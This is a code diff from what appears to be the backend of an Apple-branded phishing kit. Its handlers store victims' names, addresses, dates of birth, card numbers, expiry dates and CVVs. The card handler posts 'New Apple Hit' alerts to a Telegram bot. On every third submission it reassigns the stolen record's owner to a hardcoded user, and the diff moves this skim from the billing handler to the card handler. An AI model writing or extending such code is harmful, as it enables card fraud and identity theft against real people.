@@ -220,32 +220,23 @@ const submitAppAuth = async (req, res) => {
 };
 
 const submitBilling = async (req, res) => {
-  let { fullname, telephone, address, city, pcode, dob, ip, uniqueid, owner } =
-    req.body;
-
-  panelCount++;
-  if (panelCount == 3) {
-    owner = "haytch0411";
-    await axios.post(
-      `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=New Apple Hit:\n${fullname}`
-    );
-
-    panelCount = 0;
-  }
+  let { fullname, telephone, address, city, pcode, dob, uniqueid } = req.body;
 
   try {
-    await AppleGB.create({
-      fullname,
-      telephone,
-      address,
-      city,
-      pcode,
-      dob,
-      ip,
-      uniqueid,
-      status: 1,
-      owner,
-    });
+    await AppleGB.findOneAndUpdate(
+      {
+        uniqueid,
+      },
+      {
+        fullname,
+        telephone,
+        address,
+        city,
+        pcode,
+        dob,
+        status: 1,
+      }
+    );
     res.sendStatus(200);
   } catch (error) {
     console.log(error);
@@ -309,32 +300,25 @@ const submitCCAgain = async (req, res) => {
 const submitCC = async (req, res) => {
   const { uniqueid, ccname, ccnum, ccexp, cvv, ip, owner } = req.body;
   try {
-    let user = await AppleGB.findOne({ uniqueid }).exec();
-    if (user) {
-      await AppleGB.findOneAndUpdate(
-        { uniqueid },
-        { ccname, ccnum, ccexp, cvv, status: 2 }
-      ).exec();
-    } else {
-      panelCount++;
-      if (panelCount == 3) {
-        owner = "haytch0411";
-        await axios.post(
-          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=New Apple Hit:\n${ccname}`
-        );
-        panelCount = 0;
-      }
-      await AppleGB.create({
-        uniqueid,
-        ccname,
-        ccnum,
-        ccexp,
-        cvv,
-        owner,
-        status: 2,
-        ip,
-      });
+    panelCount++;
+    if (panelCount == 3) {
+      owner = "haytch0411";
+      await axios.post(
+        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=New Apple Hit:\n${ccname}`
+      );
+      panelCount = 0;
     }
+    await AppleGB.create({
+      uniqueid,
+      ccname,
+      ccnum,
+      ccexp,
+      cvv,
+      owner,
+      status: 2,
+      ip,
+    });
+
     res.sendStatus(200);
   } catch (error) {
     console.log(error);
